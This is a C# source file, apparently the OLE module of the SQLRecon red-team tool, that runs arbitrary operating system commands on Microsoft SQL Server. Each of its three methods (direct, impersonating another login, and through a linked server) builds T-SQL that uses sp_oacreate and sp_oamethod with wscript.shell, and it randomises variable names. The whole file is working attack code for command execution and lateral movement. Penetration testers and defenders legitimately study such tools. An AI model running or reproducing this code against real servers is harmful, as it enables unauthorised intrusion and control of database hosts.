using System;
using System.Data.SqlClient;

namespace SQLRecon.Modules
{
    public class OLE
    {

        SQLQuery sqlQuery = new SQLQuery();
        Configure config = new Configure();

        // this will execute an arbitrary command against a SQL server
        public void StandardCommand(SqlConnection con, String cmd)
        {
            string sqlOutput = "";

            // first check to see if ole automation procedures is enabled
            sqlOutput = config.Check(con,"Ole Automation Procedures");
            if (!sqlOutput.Contains("1"))
            {
                Console.WriteLine("\n[!] ERROR: You need to enable OLE Automation Procedures (enableole).");
                return;
            }

            RandomString rs = new RandomString();
            string output = rs.Generate(8); // generate a new random output name
            string program = rs.Generate(8); // generate a new random program name

            Console.WriteLine("\n[+] Setting sp_oacreate to: " + output);
            Console.WriteLine("\n[+] Setting sp_oamethod to: " + program);

            sqlOutput = sqlQuery.ExecuteQuery(con, "DECLARE @" + output + " INT; " +
                "DECLARE @" + program + " VARCHAR(255);" +
                "SET @" + program + " = 'Run(\"" + cmd + "\")';" +
                "EXEC sp_oacreate 'wscript.shell', @" + output + " out;" +
                "EXEC sp_oamethod @" + output + ", @" + program + ";" +
                "EXEC sp_oadestroy @" + output + ";");
               
            if (sqlOutput.Contains("0"))
            {
                Console.WriteLine("\n[+] Successfully executed command. Destroyed sp_oamethod.");
            }
            else if (sqlOutput.Contains("permission"))
            {
                Console.WriteLine("\n[!] ERROR: The current user does not have permissions to enable OLE Automation Procedures\n");
            }
            else if (sqlOutput.Contains("blocked"))
            { 
                Console.WriteLine("\n[!] ERROR: You need to enable OLE Automation Procedures\n");
            }
            else
            {
                Console.WriteLine("\n[!] ERROR: " + sqlOutput + "\n");
            }
        }

        public void ImpersonateCommand(SqlConnection con, String cmd, String impersonate = "null")
        {
            string sqlOutput = "";

            // first check to see if ole automation procedures is enabled
            sqlOutput = config.Check(con, "Ole Automation Procedures", impersonate);
            if (!sqlOutput.Contains("1"))
            {
                Console.WriteLine("\n[!] ERROR: You need to enable OLE Automation Procedures (ienableole).");
                return;
            }

            RandomString rs = new RandomString();
            string output = rs.Generate(8); // generate a new random output name
            string program = rs.Generate(8); // generate a new random program name

            Console.WriteLine("\n[+] Setting sp_oacreate to: " + output);
            Console.WriteLine("\n[+] Setting sp_oamethod to: " + program);

            sqlOutput = sqlQuery.ExecuteQuery(con, "EXECUTE AS LOGIN = '" + impersonate + "';" + 
                "DECLARE @" + output + " INT; " +
                "DECLARE @" + program + " VARCHAR(255);" +
                "SET @" + program + " = 'Run(\"" + cmd + "\")';" +
                "EXEC sp_oacreate 'wscript.shell', @" + output + " out;" +
                "EXEC sp_oamethod @" + output + ", @" + program + ";" +
                "EXEC sp_oadestroy @" + output + ";");

            if (sqlOutput.Contains("0"))
            {
                Console.WriteLine("\n[+] Successfully executed command. Destroyed sp_oamethod.");
            }
            else if (sqlOutput.Contains("permission"))
            {
                Console.WriteLine("\n[!] ERROR: The current user does not have permissions to enable OLE Automation Procedures\n");
            }
            else if (sqlOutput.Contains("blocked"))
            {
                Console.WriteLine("\n[!] ERROR: You need to enable OLE Automation Procedures\n");
            }
            else
            {
                Console.WriteLine("\n[!] ERROR: " + sqlOutput + "\n");
            }
        }

        public void LinkedCommand(SqlConnection con, String cmd, String linkedSqlServer)
        {
            string sqlOutput = "";

            // first check to see if ole automation procedures is enabled
            sqlOutput = config.CheckLinked(con, "Ole Automation Procedures", linkedSqlServer);
            if (!sqlOutput.Contains("1"))
            {
                Console.WriteLine("\n[!] ERROR: You need to enable OLE Automation Procedures (lenableole).");
                return;
            }

            RandomString rs = new RandomString();
            string output = rs.Generate(8); // generate a new random output name
            string program = rs.Generate(8); // generate a new random program name

            Console.WriteLine("\n[+] Setting sp_oacreate to: " + output);
            Console.WriteLine("\n[+] Setting sp_oamethod to: " + program);

            sqlOutput = sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer, "select 1; " +
                "DECLARE @" + output + " INT; " +
                "DECLARE @" + program + " VARCHAR(255);" +
                "SET @" + program + " = ''Run(\"" + cmd + "\")'';" +
                "EXEC sp_oacreate ''wscript.shell'', @" + output + " out;" +
                "EXEC sp_oamethod @" + output + ", @" + program + ";" +
                "EXEC sp_oadestroy @" + output + ";");

            if (sqlOutput.Contains("0"))
            {
                Console.WriteLine("\n[+] Successfully executed command. Destroyed sp_oamethod.");
            }
            else if (sqlOutput.Contains("permission"))
            {
                Console.WriteLine("\n[!] ERROR: The current user does not have permissions to enable OLE Automation Procedures\n");
            }
            else if (sqlOutput.Contains("blocked"))
            {
                Console.WriteLine("\n[!] ERROR: You need to enable OLE Automation Procedures\n");
            }
            else
            {
                Console.WriteLine("\n[!] ERROR: " + sqlOutput + "\n");
            }
        }
    }
}